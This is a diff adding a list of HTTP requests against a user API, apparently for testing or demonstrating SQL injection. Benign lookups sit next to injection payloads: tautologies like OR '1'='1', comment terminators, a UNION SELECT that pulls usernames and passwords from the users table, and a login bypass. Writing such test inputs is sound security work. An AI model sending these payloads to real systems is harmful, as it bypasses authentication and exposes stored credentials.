@@ -1,0 +1,21 @@
+GET /api/users/all
+GET /api/users/safe/{username}
+
+GET /api/users/by-username?username=john
+GET /api/users/by-username?username=admin' OR '1'='1
+GET /api/users/by-username?username=' OR '1'='1'--
+GET /api/users/by-username?username=' UNION SELECT * FROM users--
+GET /api/users/by-username?username=' UNION SELECT u.ID, u.USERNAME, u.PASSWORD as EMAIL, u.PASSWORD, u.ROLE FROM users u--
+
+GET /api/users/by-email?email=john@example.com
+GET /api/users/by-email?email=admin@example.com' OR '1'='1
+GET /api/users/by-email?email=' OR '1'='1'--
+
+POST /api/users/login
+{"username": "user1", "password": "password1"}
+{"username": "user1", "password": "' OR '1'='1"}
+{"username": "any' OR '1'='1", "password": "Karapuzik"}
+
+GET /api/users/by-term?term=ser
+GET /api/users/by-term?term=admin' OR '1'='1'--
+GET /api/users/by-term?term=' OR '1'='1'--
